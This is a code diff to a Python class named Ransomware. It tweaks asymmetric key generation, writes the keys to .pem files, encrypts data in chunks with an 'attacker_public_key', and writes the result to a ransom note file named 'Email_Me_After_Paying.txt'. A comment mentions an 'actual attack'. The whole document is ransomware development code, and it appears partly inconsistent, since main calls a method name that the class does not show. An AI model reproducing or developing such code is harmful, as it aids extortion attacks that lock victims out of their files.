@@ -32,9 +32,9 @@ class Ransomware:
 
     # Writes clients both keys to the disk. Delete private key section before actual attack.
     def write_keys(self):
-        with open('private_key.txt', 'wb') as f1:
+        with open('private_key.pem', 'wb') as f1:
             f1.write(self.privkey_pem)
-        with open('public_key.txt', 'wb') as f2:
+        with open('public_key.pem', 'wb') as f2:
             f2.write(self.pubkey_pem)
 
     def encrypt_private_key(self):
@@ -63,7 +63,7 @@ class Ransomware:
 
 
 def encrypt_blob(fileblob, attacker_public_key):
-    chunk_size = 100
+    chunk_size = 430
     offset = 0
     end_loop = False
     encrypted = b""
@@ -84,13 +84,14 @@ def encrypt_blob(fileblob, attacker_public_key):
     encrypted_blob = base64.b64encode(encrypted)
     with open("./Email_Me_After_Paying.txt", "wb") as fa:
         fa.write(encrypted_blob)
+    print(encrypted_blob)
 
 
 def main():
     foo = Ransomware()
     foo.generate_asy_keys()
     foo.write_keys()
-    foo.encrypt_blob()
+    foo.enc_private_key()
 
 
 if __name__ == '__main__':
